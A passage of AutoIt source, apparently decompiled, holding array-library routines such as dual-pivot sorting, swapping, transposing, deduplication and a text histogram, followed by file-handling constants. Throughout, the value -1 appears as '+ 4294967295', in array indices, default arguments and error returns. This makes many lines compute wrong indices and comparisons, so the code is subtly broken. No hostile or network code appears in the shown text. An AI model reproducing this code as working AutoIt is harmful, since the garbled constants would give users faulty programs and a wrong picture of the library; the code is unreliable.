				$AARRAY [ $K + 1 ] = $IA2
				$IPIVOT_LEFT += 1
			WEnd
			$ILAST = $AARRAY [ $IPIVOT_RIGHT ]
			$IPIVOT_RIGHT -= 1
			While $ILAST < $AARRAY [ $IPIVOT_RIGHT ]
				$AARRAY [ $IPIVOT_RIGHT + 1 ] = $AARRAY [ $IPIVOT_RIGHT ]
				$IPIVOT_RIGHT -= 1
			WEnd
			$AARRAY [ $IPIVOT_RIGHT + 1 ] = $ILAST
		EndIf
		Return 1
	EndIf
	Local $ISEVENTH = BitShift ( $ILENGTH , 3 ) + BitShift ( $ILENGTH , 6 ) + 1
	Local $IE1 , $IE2 , $IE3 , $IE4 , $IE5 , $T
	$IE3 = Ceiling ( ( $IPIVOT_LEFT + $IPIVOT_RIGHT ) / 2 )
	$IE2 = $IE3 - $ISEVENTH
	$IE1 = $IE2 - $ISEVENTH
	$IE4 = $IE3 + $ISEVENTH
	$IE5 = $IE4 + $ISEVENTH
	If $AARRAY [ $IE2 ] < $AARRAY [ $IE1 ] Then
		$T = $AARRAY [ $IE2 ]
		$AARRAY [ $IE2 ] = $AARRAY [ $IE1 ]
		$AARRAY [ $IE1 ] = $T
	EndIf
	If $AARRAY [ $IE3 ] < $AARRAY [ $IE2 ] Then
		$T = $AARRAY [ $IE3 ]
		$AARRAY [ $IE3 ] = $AARRAY [ $IE2 ]
		$AARRAY [ $IE2 ] = $T
		If $T < $AARRAY [ $IE1 ] Then
			$AARRAY [ $IE2 ] = $AARRAY [ $IE1 ]
			$AARRAY [ $IE1 ] = $T
		EndIf
	EndIf
	If $AARRAY [ $IE4 ] < $AARRAY [ $IE3 ] Then
		$T = $AARRAY [ $IE4 ]
		$AARRAY [ $IE4 ] = $AARRAY [ $IE3 ]
		$AARRAY [ $IE3 ] = $T
		If $T < $AARRAY [ $IE2 ] Then
			$AARRAY [ $IE3 ] = $AARRAY [ $IE2 ]
			$AARRAY [ $IE2 ] = $T
			If $T < $AARRAY [ $IE1 ] Then
				$AARRAY [ $IE2 ] = $AARRAY [ $IE1 ]
				$AARRAY [ $IE1 ] = $T
			EndIf
		EndIf
	EndIf
	If $AARRAY [ $IE5 ] < $AARRAY [ $IE4 ] Then
		$T = $AARRAY [ $IE5 ]
		$AARRAY [ $IE5 ] = $AARRAY [ $IE4 ]
		$AARRAY [ $IE4 ] = $T
		If $T < $AARRAY [ $IE3 ] Then
			$AARRAY [ $IE4 ] = $AARRAY [ $IE3 ]
			$AARRAY [ $IE3 ] = $T
			If $T < $AARRAY [ $IE2 ] Then
				$AARRAY [ $IE3 ] = $AARRAY [ $IE2 ]
				$AARRAY [ $IE2 ] = $T
				If $T < $AARRAY [ $IE1 ] Then
					$AARRAY [ $IE2 ] = $AARRAY [ $IE1 ]
					$AARRAY [ $IE1 ] = $T
				EndIf
			EndIf
		EndIf
	EndIf
	Local $ILESS = $IPIVOT_LEFT
	Local $IGREATER = $IPIVOT_RIGHT
	If ( ( $AARRAY [ $IE1 ] <> $AARRAY [ $IE2 ] ) And ( $AARRAY [ $IE2 ] <> $AARRAY [ $IE3 ] ) And ( $AARRAY [ $IE3 ] <> $AARRAY [ $IE4 ] ) And ( $AARRAY [ $IE4 ] <> $AARRAY [ $IE5 ] ) ) Then
		Local $IPIVOT_1 = $AARRAY [ $IE2 ]
		Local $IPIVOT_2 = $AARRAY [ $IE4 ]
		$AARRAY [ $IE2 ] = $AARRAY [ $IPIVOT_LEFT ]
		$AARRAY [ $IE4 ] = $AARRAY [ $IPIVOT_RIGHT ]
		Do
			$ILESS += 1
		Until $AARRAY [ $ILESS ] >= $IPIVOT_1
		Do
			$IGREATER -= 1
		Until $AARRAY [ $IGREATER ] <= $IPIVOT_2
		$K = $ILESS
		While $K <= $IGREATER
			$IAK = $AARRAY [ $K ]
			If $IAK < $IPIVOT_1 Then
				$AARRAY [ $K ] = $AARRAY [ $ILESS ]
				$AARRAY [ $ILESS ] = $IAK
				$ILESS += 1
			ElseIf $IAK > $IPIVOT_2 Then
				While $AARRAY [ $IGREATER ] > $IPIVOT_2
					$IGREATER -= 1
					If $IGREATER + 1 = $K Then ExitLoop 2
				WEnd
				If $AARRAY [ $IGREATER ] < $IPIVOT_1 Then
					$AARRAY [ $K ] = $AARRAY [ $ILESS ]
					$AARRAY [ $ILESS ] = $AARRAY [ $IGREATER ]
					$ILESS += 1
				Else
					$AARRAY [ $K ] = $AARRAY [ $IGREATER ]
				EndIf
				$AARRAY [ $IGREATER ] = $IAK
				$IGREATER -= 1
			EndIf
			$K += 1
		WEnd
		$AARRAY [ $IPIVOT_LEFT ] = $AARRAY [ $ILESS + 4294967295 ]
		$AARRAY [ $ILESS + 4294967295 ] = $IPIVOT_1
		$AARRAY [ $IPIVOT_RIGHT ] = $AARRAY [ $IGREATER + 1 ]
		$AARRAY [ $IGREATER + 1 ] = $IPIVOT_2
		__ARRAYDUALPIVOTSORT ( $AARRAY , $IPIVOT_LEFT , $ILESS + 4294967294 , True )
		__ARRAYDUALPIVOTSORT ( $AARRAY , $IGREATER + 2 , $IPIVOT_RIGHT , False )
		If ( $ILESS < $IE1 ) And ( $IE5 < $IGREATER ) Then
			While $AARRAY [ $ILESS ] = $IPIVOT_1
				$ILESS += 1
			WEnd
			While $AARRAY [ $IGREATER ] = $IPIVOT_2
				$IGREATER -= 1
			WEnd
			$K = $ILESS
			While $K <= $IGREATER
				$IAK = $AARRAY [ $K ]
				If $IAK = $IPIVOT_1 Then
					$AARRAY [ $K ] = $AARRAY [ $ILESS ]
					$AARRAY [ $ILESS ] = $IAK
					$ILESS += 1
				ElseIf $IAK = $IPIVOT_2 Then
					While $AARRAY [ $IGREATER ] = $IPIVOT_2
						$IGREATER -= 1
						If $IGREATER + 1 = $K Then ExitLoop 2
					WEnd
					If $AARRAY [ $IGREATER ] = $IPIVOT_1 Then
						$AARRAY [ $K ] = $AARRAY [ $ILESS ]
						$AARRAY [ $ILESS ] = $IPIVOT_1
						$ILESS += 1
					Else
						$AARRAY [ $K ] = $AARRAY [ $IGREATER ]
					EndIf
					$AARRAY [ $IGREATER ] = $IAK
					$IGREATER -= 1
				EndIf
				$K += 1
			WEnd
		EndIf
		__ARRAYDUALPIVOTSORT ( $AARRAY , $ILESS , $IGREATER , False )
	Else
		Local $IPIVOT = $AARRAY [ $IE3 ]
		$K = $ILESS
		While $K <= $IGREATER
			If $AARRAY [ $K ] = $IPIVOT Then
				$K += 1
				ContinueLoop
			EndIf
			$IAK = $AARRAY [ $K ]
			If $IAK < $IPIVOT Then
				$AARRAY [ $K ] = $AARRAY [ $ILESS ]
				$AARRAY [ $ILESS ] = $IAK
				$ILESS += 1
			Else
				While $AARRAY [ $IGREATER ] > $IPIVOT
					$IGREATER -= 1
				WEnd
				If $AARRAY [ $IGREATER ] < $IPIVOT Then
					$AARRAY [ $K ] = $AARRAY [ $ILESS ]
					$AARRAY [ $ILESS ] = $AARRAY [ $IGREATER ]
					$ILESS += 1
				Else
					$AARRAY [ $K ] = $IPIVOT
				EndIf
				$AARRAY [ $IGREATER ] = $IAK
				$IGREATER -= 1
			EndIf
			$K += 1
		WEnd
		__ARRAYDUALPIVOTSORT ( $AARRAY , $IPIVOT_LEFT , $ILESS + 4294967295 , True )
		__ARRAYDUALPIVOTSORT ( $AARRAY , $IGREATER + 1 , $IPIVOT_RIGHT , False )
	EndIf
EndFunc
Func _ARRAYSWAP ( ByRef $AARRAY , $IINDEX_1 , $IINDEX_2 , $BCOL = False , $ISTART = + 4294967295 , $IEND = + 4294967295 )
	If $BCOL = Default Then $BCOL = False
	If $ISTART = Default Then $ISTART = + 4294967295
	If $IEND = Default Then $IEND = + 4294967295
	If Not IsArray ( $AARRAY ) Then Return SetError ( 1 , 0 , + 4294967295 )
	Local $IDIM_1 = UBound ( $AARRAY , $UBOUND_ROWS ) + 4294967295
	Local $IDIM_2 = UBound ( $AARRAY , $UBOUND_COLUMNS ) + 4294967295
	If $IDIM_2 = + 4294967295 Then
		$BCOL = False
		$ISTART = + 4294967295
		$IEND = + 4294967295
	EndIf
	If $ISTART > $IEND Then Return SetError ( 5 , 0 , + 4294967295 )
	If $BCOL Then
		If $IINDEX_1 < 0 Or $IINDEX_2 > $IDIM_2 Then Return SetError ( 3 , 0 , + 4294967295 )
		If $ISTART = + 4294967295 Then $ISTART = 0
		If $IEND = + 4294967295 Then $IEND = $IDIM_1
	Else
		If $IINDEX_1 < 0 Or $IINDEX_2 > $IDIM_1 Then Return SetError ( 3 , 0 , + 4294967295 )
		If $ISTART = + 4294967295 Then $ISTART = 0
		If $IEND = + 4294967295 Then $IEND = $IDIM_2
	EndIf
	Local $VTMP
	Switch UBound ( $AARRAY , $UBOUND_DIMENSIONS )
	Case 1
		$VTMP = $AARRAY [ $IINDEX_1 ]
		$AARRAY [ $IINDEX_1 ] = $AARRAY [ $IINDEX_2 ]
		$AARRAY [ $IINDEX_2 ] = $VTMP
	Case 2
		If $ISTART < + 4294967295 Or $IEND < + 4294967295 Then Return SetError ( 4 , 0 , + 4294967295 )
		If $BCOL Then
			If $ISTART > $IDIM_1 Or $IEND > $IDIM_1 Then Return SetError ( 4 , 0 , + 4294967295 )
			For $J = $ISTART To $IEND
				$VTMP = $AARRAY [ $J ] [ $IINDEX_1 ]
				$AARRAY [ $J ] [ $IINDEX_1 ] = $AARRAY [ $J ] [ $IINDEX_2 ]
				$AARRAY [ $J ] [ $IINDEX_2 ] = $VTMP
			Next
		Else
			If $ISTART > $IDIM_2 Or $IEND > $IDIM_2 Then Return SetError ( 4 , 0 , + 4294967295 )
			For $J = $ISTART To $IEND
				$VTMP = $AARRAY [ $IINDEX_1 ] [ $J ]
				$AARRAY [ $IINDEX_1 ] [ $J ] = $AARRAY [ $IINDEX_2 ] [ $J ]
				$AARRAY [ $IINDEX_2 ] [ $J ] = $VTMP
			Next
		EndIf
Case Else
		Return SetError ( 2 , 0 , + 4294967295 )
	EndSwitch
	Return 1
EndFunc
Func _ARRAYTOCLIP ( Const ByRef $AARRAY , $SDELIM_COL = "|" , $ISTART_ROW = + 4294967295 , $IEND_ROW = + 4294967295 , $SDELIM_ROW = @CRLF , $ISTART_COL = + 4294967295 , $IEND_COL = + 4294967295 )
	Local $SRESULT = _ARRAYTOSTRING ( $AARRAY , $SDELIM_COL , $ISTART_ROW , $IEND_ROW , $SDELIM_ROW , $ISTART_COL , $IEND_COL )
	If @error Then Return SetError ( @error , 0 , 0 )
	If ClipPut ( $SRESULT ) Then Return 1
	Return SetError ( + 4294967295 , 0 , 0 )
EndFunc
Func _ARRAYTOSTRING ( Const ByRef $AARRAY , $SDELIM_COL = "|" , $ISTART_ROW = + 4294967295 , $IEND_ROW = + 4294967295 , $SDELIM_ROW = @CRLF , $ISTART_COL = + 4294967295 , $IEND_COL = + 4294967295 )
	If $SDELIM_COL = Default Then $SDELIM_COL = "|"
	If $SDELIM_ROW = Default Then $SDELIM_ROW = @CRLF
	If $ISTART_ROW = Default Then $ISTART_ROW = + 4294967295
	If $IEND_ROW = Default Then $IEND_ROW = + 4294967295
	If $ISTART_COL = Default Then $ISTART_COL = + 4294967295
	If $IEND_COL = Default Then $IEND_COL = + 4294967295
	If Not IsArray ( $AARRAY ) Then Return SetError ( 1 , 0 , + 4294967295 )
	Local $IDIM_1 = UBound ( $AARRAY , $UBOUND_ROWS ) + 4294967295
	If $ISTART_ROW = + 4294967295 Then $ISTART_ROW = 0
	If $IEND_ROW = + 4294967295 Then $IEND_ROW = $IDIM_1
	If $ISTART_ROW < + 4294967295 Or $IEND_ROW < + 4294967295 Then Return SetError ( 3 , 0 , + 4294967295 )
	If $ISTART_ROW > $IDIM_1 Or $IEND_ROW > $IDIM_1 Then Return SetError ( 3 , 0 , "" )
	If $ISTART_ROW > $IEND_ROW Then Return SetError ( 4 , 0 , + 4294967295 )
	Local $SRET = ""
	Switch UBound ( $AARRAY , $UBOUND_DIMENSIONS )
	Case 1
		For $I = $ISTART_ROW To $IEND_ROW
			$SRET &= $AARRAY [ $I ] & $SDELIM_COL
		Next
		Return StringTrimRight ( $SRET , StringLen ( $SDELIM_COL ) )
	Case 2
		Local $IDIM_2 = UBound ( $AARRAY , $UBOUND_COLUMNS ) + 4294967295
		If $ISTART_COL = + 4294967295 Then $ISTART_COL = 0
		If $IEND_COL = + 4294967295 Then $IEND_COL = $IDIM_2
		If $ISTART_COL < + 4294967295 Or $IEND_COL < + 4294967295 Then Return SetError ( 5 , 0 , + 4294967295 )
		If $ISTART_COL > $IDIM_2 Or $IEND_COL > $IDIM_2 Then Return SetError ( 5 , 0 , + 4294967295 )
		If $ISTART_COL > $IEND_COL Then Return SetError ( 6 , 0 , + 4294967295 )
		For $I = $ISTART_ROW To $IEND_ROW
			For $J = $ISTART_COL To $IEND_COL
				$SRET &= $AARRAY [ $I ] [ $J ] & $SDELIM_COL
			Next
			$SRET = StringTrimRight ( $SRET , StringLen ( $SDELIM_COL ) ) & $SDELIM_ROW
		Next
		Return StringTrimRight ( $SRET , StringLen ( $SDELIM_ROW ) )
Case Else
		Return SetError ( 2 , 0 , + 4294967295 )
	EndSwitch
	Return 1
EndFunc
Func _ARRAYTRANSPOSE ( ByRef $AARRAY )
	Switch UBound ( $AARRAY , 0 )
	Case 0
		Return SetError ( 2 , 0 , 0 )
	Case 1
		Local $ATEMP [ 1 ] [ UBound ( $AARRAY ) ]
		For $I = 0 To UBound ( $AARRAY ) + 4294967295
			$ATEMP [ 0 ] [ $I ] = $AARRAY [ $I ]
		Next
		$AARRAY = $ATEMP
	Case 2
		Local $IDIM_1 = UBound ( $AARRAY , 1 ) , $IDIM_2 = UBound ( $AARRAY , 2 )
		If $IDIM_1 <> $IDIM_2 Then
			Local $ATEMP [ $IDIM_2 ] [ $IDIM_1 ]
			For $I = 0 To $IDIM_1 + 4294967295
				For $J = 0 To $IDIM_2 + 4294967295
					$ATEMP [ $J ] [ $I ] = $AARRAY [ $I ] [ $J ]
				Next
			Next
			$AARRAY = $ATEMP
		Else
			Local $VELEMENT
			For $I = 0 To $IDIM_1 + 4294967295
				For $J = $I + 1 To $IDIM_2 + 4294967295
					$VELEMENT = $AARRAY [ $I ] [ $J ]
					$AARRAY [ $I ] [ $J ] = $AARRAY [ $J ] [ $I ]
					$AARRAY [ $J ] [ $I ] = $VELEMENT
				Next
			Next
		EndIf
Case Else
		Return SetError ( 1 , 0 , 0 )
	EndSwitch
	Return 1
EndFunc
Func _ARRAYTRIM ( ByRef $AARRAY , $ITRIMNUM , $IDIRECTION = 0 , $ISTART = 0 , $IEND = 0 , $ISUBITEM = 0 )
	If $IDIRECTION = Default Then $IDIRECTION = 0
	If $ISTART = Default Then $ISTART = 0
	If $IEND = Default Then $IEND = 0
	If $ISUBITEM = Default Then $ISUBITEM = 0
	If Not IsArray ( $AARRAY ) Then Return SetError ( 1 , 0 , 0 )
	Local $IDIM_1 = UBound ( $AARRAY , $UBOUND_ROWS ) + 4294967295
	If $IEND = 0 Then $IEND = $IDIM_1
	If $ISTART > $IEND Then Return SetError ( 3 , 0 , + 4294967295 )
	If $ISTART < 0 Or $IEND < 0 Then Return SetError ( 3 , 0 , + 4294967295 )
	If $ISTART > $IDIM_1 Or $IEND > $IDIM_1 Then Return SetError ( 3 , 0 , + 4294967295 )
	If $ISTART > $IEND Then Return SetError ( 4 , 0 , + 4294967295 )
	Switch UBound ( $AARRAY , $UBOUND_DIMENSIONS )
	Case 1
		If $IDIRECTION Then
			For $I = $ISTART To $IEND
				$AARRAY [ $I ] = StringTrimRight ( $AARRAY [ $I ] , $ITRIMNUM )
			Next
		Else
			For $I = $ISTART To $IEND
				$AARRAY [ $I ] = StringTrimLeft ( $AARRAY [ $I ] , $ITRIMNUM )
			Next
		EndIf
	Case 2
		Local $IDIM_2 = UBound ( $AARRAY , $UBOUND_COLUMNS ) + 4294967295
		If $ISUBITEM < 0 Or $ISUBITEM > $IDIM_2 Then Return SetError ( 5 , 0 , + 4294967295 )
		If $IDIRECTION Then
			For $I = $ISTART To $IEND
				$AARRAY [ $I ] [ $ISUBITEM ] = StringTrimRight ( $AARRAY [ $I ] [ $ISUBITEM ] , $ITRIMNUM )
			Next
		Else
			For $I = $ISTART To $IEND
				$AARRAY [ $I ] [ $ISUBITEM ] = StringTrimLeft ( $AARRAY [ $I ] [ $ISUBITEM ] , $ITRIMNUM )
			Next
		EndIf
Case Else
		Return SetError ( 2 , 0 , 0 )
	EndSwitch
	Return 1
EndFunc
Func _ARRAYUNIQUE ( Const ByRef $AARRAY , $ICOLUMN = 0 , $IBASE = 0 , $ICASE = 0 , $ICOUNT = $ARRAYUNIQUE_COUNT , $IINTTYPE = $ARRAYUNIQUE_AUTO )
	If $ICOLUMN = Default Then $ICOLUMN = 0
	If $IBASE = Default Then $IBASE = 0
	If $ICASE = Default Then $ICASE = 0
	If $ICOUNT = Default Then $ICOUNT = $ARRAYUNIQUE_COUNT
	If UBound ( $AARRAY , $UBOUND_ROWS ) = 0 Then Return SetError ( 1 , 0 , 0 )
	Local $IDIMS = UBound ( $AARRAY , $UBOUND_DIMENSIONS ) , $INUMCOLUMNS = UBound ( $AARRAY , $UBOUND_COLUMNS )
	If $IDIMS > 2 Then Return SetError ( 2 , 0 , 0 )
	If $IBASE < 0 Or $IBASE > 1 Or ( Not IsInt ( $IBASE ) ) Then Return SetError ( 3 , 0 , 0 )
	If $ICASE < 0 Or $ICASE > 1 Or ( Not IsInt ( $ICASE ) ) Then Return SetError ( 3 , 0 , 0 )
	If $ICOUNT < 0 Or $ICOUNT > 1 Or ( Not IsInt ( $ICOUNT ) ) Then Return SetError ( 4 , 0 , 0 )
	If $IINTTYPE < 0 Or $IINTTYPE > 4 Or ( Not IsInt ( $IINTTYPE ) ) Then Return SetError ( 5 , 0 , 0 )
	If $ICOLUMN < 0 Or ( $INUMCOLUMNS = 0 And $ICOLUMN > 0 ) Or ( $INUMCOLUMNS > 0 And $ICOLUMN >= $INUMCOLUMNS ) Then Return SetError ( 6 , 0 , 0 )
	If $IINTTYPE = $ARRAYUNIQUE_AUTO Then
		Local $VFIRSTELEM = ( ( $IDIMS = 1 ) ? ( $AARRAY [ $IBASE ] ) : ( $AARRAY [ $ICOLUMN ] [ $IBASE ] ) )
		If IsInt ( $VFIRSTELEM ) Then
			Switch VarGetType ( $VFIRSTELEM )
			Case "Int32"
				$IINTTYPE = $ARRAYUNIQUE_FORCE32
			Case "Int64"
				$IINTTYPE = $ARRAYUNIQUE_FORCE64
			EndSwitch
		Else
			$IINTTYPE = $ARRAYUNIQUE_FORCE32
		EndIf
	EndIf
	ObjEvent ( "AutoIt.Error" , "__ArrayUnique_AutoErrFunc" )
	Local $ODICTIONARY = ObjCreate ( "Scripting.Dictionary" )
	$ODICTIONARY .CompareMode = Number ( Not $ICASE )
	Local $VELEM , $STYPE , $VKEY , $BCOMERROR = False
	For $I = $IBASE To UBound ( $AARRAY ) + 4294967295
		If $IDIMS = 1 Then
			$VELEM = $AARRAY [ $I ]
		Else
			$VELEM = $AARRAY [ $I ] [ $ICOLUMN ]
		EndIf
		Switch $IINTTYPE
		Case $ARRAYUNIQUE_FORCE32
			$ODICTIONARY .Item ( $VELEM )
			If @error Then
				$BCOMERROR = True
				ExitLoop
			EndIf
		Case $ARRAYUNIQUE_FORCE64
			$STYPE = VarGetType ( $VELEM )
			If $STYPE = "Int32" Then
				$BCOMERROR = True
				ExitLoop
			EndIf
			$VKEY = "#" & $STYPE & "#" & String ( $VELEM )
			If Not $ODICTIONARY .Item ( $VKEY ) Then
				$ODICTIONARY ( $VKEY ) = $VELEM
			EndIf
		Case $ARRAYUNIQUE_MATCH
			$STYPE = VarGetType ( $VELEM )
			If StringLeft ( $STYPE , 3 ) = "Int" Then
				$VKEY = "#Int#" & String ( $VELEM )
			Else
				$VKEY = "#" & $STYPE & "#" & String ( $VELEM )
			EndIf
			If Not $ODICTIONARY .Item ( $VKEY ) Then
				$ODICTIONARY ( $VKEY ) = $VELEM
			EndIf
		Case $ARRAYUNIQUE_DISTINCT
			$VKEY = "#" & VarGetType ( $VELEM ) & "#" & String ( $VELEM )
			If Not $ODICTIONARY .Item ( $VKEY ) Then
				$ODICTIONARY ( $VKEY ) = $VELEM
			EndIf
		EndSwitch
	Next
	Local $AVALUES , $J = 0
	If $BCOMERROR Then
		Return SetError ( 7 , 0 , 0 )
	ElseIf $IINTTYPE <> $ARRAYUNIQUE_FORCE32 Then
		Local $AVALUES [ $ODICTIONARY .Count ]
		For $VKEY In $ODICTIONARY .Keys ( )
			$AVALUES [ $J ] = $ODICTIONARY ( $VKEY )
			If StringLeft ( $VKEY , 5 ) = "#Ptr#" Then
				$AVALUES [ $J ] = Ptr ( $AVALUES [ $J ] )
			EndIf
			$J += 1
		Next
	Else
		$AVALUES = $ODICTIONARY .Keys ( )
	EndIf
	If $ICOUNT Then
		_ARRAYINSERT ( $AVALUES , 0 , $ODICTIONARY .Count )
	EndIf
	Return $AVALUES
EndFunc
Func _ARRAY1DTOHISTOGRAM ( $AARRAY , $ISIZING = 100 )
	If UBound ( $AARRAY , 0 ) > 1 Then Return SetError ( 1 , 0 , "" )
	$ISIZING = $ISIZING * 8
	Local $T , $N , $IMIN = 0 , $IMAX = 0 , $IOFFSET = 0
	For $I = 0 To UBound ( $AARRAY ) + 4294967295
		$T = $AARRAY [ $I ]
		$T = IsNumber ( $T ) ? Round ( $T ) : 0
		If $T < $IMIN Then $IMIN = $T
		If $T > $IMAX Then $IMAX = $T
	Next
	Local $IRANGE = Int ( Round ( ( $IMAX - $IMIN ) / 8 ) ) * 8
	Local $ISPACERATIO = 4
	For $I = 0 To UBound ( $AARRAY ) + 4294967295
		$T = $AARRAY [ $I ]
		If $T Then
			$N = Abs ( Round ( ( $ISIZING * $T ) / $IRANGE ) / 8 )
			$AARRAY [ $I ] = ""
			If $T > 0 Then
				If $IMIN Then
					$IOFFSET = Int ( Abs ( Round ( ( $ISIZING * $IMIN ) / $IRANGE ) / 8 ) / 8 * $ISPACERATIO )
					$AARRAY [ $I ] = __ARRAY_STRINGREPEAT ( ChrW ( 32 ) , $IOFFSET )
				EndIf
			Else
				If $IMIN <> $T Then
					$IOFFSET = Int ( Abs ( Round ( ( $ISIZING * ( $T - $IMIN ) ) / $IRANGE ) / 8 ) / 8 * $ISPACERATIO )
					$AARRAY [ $I ] = __ARRAY_STRINGREPEAT ( ChrW ( 32 ) , $IOFFSET )
				EndIf
			EndIf
			$AARRAY [ $I ] &= __ARRAY_STRINGREPEAT ( ChrW ( 9608 ) , Int ( $N / 8 ) )
			$N = Mod ( $N , 8 )
			If $N > 0 Then $AARRAY [ $I ] &= ChrW ( 9608 + 8 - $N )
			$AARRAY [ $I ] &= " " & $T
		Else
			$AARRAY [ $I ] = ""
		EndIf
	Next
	Return $AARRAY
EndFunc
Func __ARRAY_STRINGREPEAT ( $SSTRING , $IREPEATCOUNT )
	$IREPEATCOUNT = Int ( $IREPEATCOUNT )
	If StringLen ( $SSTRING ) < 1 Or $IREPEATCOUNT <= 0 Then Return SetError ( 1 , 0 , "" )
	Local $SRESULT = ""
	While $IREPEATCOUNT > 1
		If BitAND ( $IREPEATCOUNT , 1 ) Then $SRESULT &= $SSTRING
		$SSTRING &= $SSTRING
		$IREPEATCOUNT = BitShift ( $IREPEATCOUNT , 1 )
	WEnd
	Return $SSTRING & $SRESULT
EndFunc
Func __ARRAY_EXETERINTERNAL ( ByRef $AARRAY , $ISTART , $ISIZE , $SDELIMITER , ByRef $AIDX , ByRef $ARESULT , ByRef $ICOUNT )
	If $ISTART == $ISIZE + 4294967295 Then
		For $I = 0 To $ISIZE + 4294967295
			$ARESULT [ $ICOUNT ] &= $AARRAY [ $AIDX [ $I ] ] & $SDELIMITER
		Next
		If $SDELIMITER <> "" Then $ARESULT [ $ICOUNT ] = StringTrimRight ( $ARESULT [ $ICOUNT ] , StringLen ( $SDELIMITER ) )
		$ICOUNT += 1
	Else
		Local $ITEMP
		For $I = $ISTART To $ISIZE + 4294967295
			$ITEMP = $AIDX [ $I ]
			$AIDX [ $I ] = $AIDX [ $ISTART ]
			$AIDX [ $ISTART ] = $ITEMP
			__ARRAY_EXETERINTERNAL ( $AARRAY , $ISTART + 1 , $ISIZE , $SDELIMITER , $AIDX , $ARESULT , $ICOUNT )
			$AIDX [ $ISTART ] = $AIDX [ $I ]
			$AIDX [ $I ] = $ITEMP
		Next
	EndIf
EndFunc
Func __ARRAY_COMBINATIONS ( $IN , $IR )
	Local $I_TOTAL = 1
	For $I = $IR To 1 Step + 4294967295
		$I_TOTAL *= ( $IN / $I )
		$IN -= 1
	Next
	Return Round ( $I_TOTAL )
EndFunc
Func __ARRAY_GETNEXT ( $IN , $IR , ByRef $ILEFT , $ITOTAL , ByRef $AIDX )
	If $ILEFT == $ITOTAL Then
		$ILEFT -= 1
		Return
	EndIf
	Local $I = $IR + 4294967295
	While $AIDX [ $I ] == $IN - $IR + $I
		$I -= 1
	WEnd
	$AIDX [ $I ] += 1
	For $J = $I + 1 To $IR + 4294967295
		$AIDX [ $J ] = $AIDX [ $I ] + $J - $I
	Next
	$ILEFT -= 1
EndFunc
Func __ARRAY_MINMAXINDEX ( Const ByRef $AARRAY , $ICOMPNUMERIC , $ISTART , $IEND , $ISUBITEM , $FUCOMPARISON )
	If $ICOMPNUMERIC = Default Then $ICOMPNUMERIC = 0
	If $ICOMPNUMERIC <> 1 Then $ICOMPNUMERIC = 0
	If $ISTART = Default Then $ISTART = 0
	If $IEND = Default Then $IEND = 0
	If $ISUBITEM = Default Then $ISUBITEM = 0
	If Not IsArray ( $AARRAY ) Then Return SetError ( 1 , 0 , + 4294967295 )
	Local $IDIM_1 = UBound ( $AARRAY , $UBOUND_ROWS ) + 4294967295
	If $IDIM_1 < 0 Then Return SetError ( 1 , 0 , + 4294967295 )
	If $IEND = + 4294967295 Then $IEND = $IDIM_1
	If $ISTART = + 4294967295 Then $ISTART = 0
	If $ISTART < + 4294967295 Or $IEND < + 4294967295 Then Return SetError ( 3 , 0 , + 4294967295 )
	If $ISTART > $IDIM_1 Or $IEND > $IDIM_1 Then Return SetError ( 3 , 0 , + 4294967295 )
	If $ISTART > $IEND Then Return SetError ( 4 , 0 , + 4294967295 )
	If $IDIM_1 < 0 Then Return SetError ( 5 , 0 , + 4294967295 )
	Local $IMAXMININDEX = $ISTART
	Switch UBound ( $AARRAY , $UBOUND_DIMENSIONS )
	Case 1
		If $ICOMPNUMERIC Then
			For $I = $ISTART To $IEND
				If $FUCOMPARISON ( Number ( $AARRAY [ $I ] ) , Number ( $AARRAY [ $IMAXMININDEX ] ) ) Then $IMAXMININDEX = $I
			Next
		Else
			For $I = $ISTART To $IEND
				If $FUCOMPARISON ( $AARRAY [ $I ] , $AARRAY [ $IMAXMININDEX ] ) Then $IMAXMININDEX = $I
			Next
		EndIf
	Case 2
		If $ISUBITEM < 0 Or $ISUBITEM > UBound ( $AARRAY , $UBOUND_COLUMNS ) + 4294967295 Then Return SetError ( 6 , 0 , + 4294967295 )
		If $ICOMPNUMERIC Then
			For $I = $ISTART To $IEND
				If $FUCOMPARISON ( Number ( $AARRAY [ $I ] [ $ISUBITEM ] ) , Number ( $AARRAY [ $IMAXMININDEX ] [ $ISUBITEM ] ) ) Then $IMAXMININDEX = $I
			Next
		Else
			For $I = $ISTART To $IEND
				If $FUCOMPARISON ( $AARRAY [ $I ] [ $ISUBITEM ] , $AARRAY [ $IMAXMININDEX ] [ $ISUBITEM ] ) Then $IMAXMININDEX = $I
			Next
		EndIf
Case Else
		Return SetError ( 2 , 0 , + 4294967295 )
	EndSwitch
	Return $IMAXMININDEX
EndFunc
Func __ARRAY_GREATERTHAN ( $VVALUE1 , $VVALUE2 )
	Return $VVALUE1 > $VVALUE2
EndFunc
Func __ARRAY_LESSTHAN ( $VVALUE1 , $VVALUE2 )
	Return $VVALUE1 < $VVALUE2
EndFunc
Func __ARRAYUNIQUE_AUTOERRFUNC ( )
EndFunc
Global Const $FC_NOOVERWRITE = 0
Global Const $FC_OVERWRITE = 1
Global Const $FC_CREATEPATH = 8
Global Const $FT_MODIFIED = 0
Global Const $FT_CREATED = 1
Global Const $FT_ACCESSED = 2
Global Const $FT_ARRAY = 0
Global Const $FT_STRING = 1
Global Const $FSF_CREATEBUTTON = 1
Global Const $FSF_NEWDIALOG = 2
Global Const $FSF_EDITCONTROL = 4
Global Const $FT_NONRECURSIVE = 0
Global Const $FT_RECURSIVE = 1
Global Const $FO_READ = 0
Global Const $FO_APPEND = 1
Global Const $FO_OVERWRITE = 2
Global Const $FO_CREATEPATH = 8
Global Const $FO_BINARY = 16
Global Const $FO_UNICODE = 32
Global Const $FO_UTF16_LE = 32
Global Const $FO_UTF16_BE = 64
Global Const $FO_UTF8 = 128
Global Const $FO_UTF8_NOBOM = 256
Global Const $FO_ANSI = 512
Global Const $FO_UTF16_LE_NOBOM = 1024
Global Const $FO_UTF16_BE_NOBOM = 2048
Global Const $FO_UTF8_FULL = 16384
Global Const $FO_FULLFILE_DETECT = 16384
Global Const $EOF = + 4294967295
Global Const $FD_FILEMUSTEXIST = 1
Global Const $FD_PATHMUSTEXIST = 2
Global Const $FD_MULTISELECT = 4
Global Const $FD_PROMPTCREATENEW = 8
Global Const $FD_PROMPTOVERWRITE = 16
Global Const $CREATE_NEW = 1
Global Const $CREATE_ALWAYS = 2
Global Const $OPEN_EXISTING = 3
Global Const $OPEN_ALWAYS = 4
Global Const $TRUNCATE_EXISTING = 5
Global Const $INVALID_SET_FILE_POINTER = + 4294967295
Global Const $FILE_BEGIN = 0
Global Const $FILE_CURRENT = 1
Global Const $FILE_END = 2
Global Const $FILE_ATTRIBUTE_READONLY = 1
Global Const $FILE_ATTRIBUTE_HIDDEN = 2
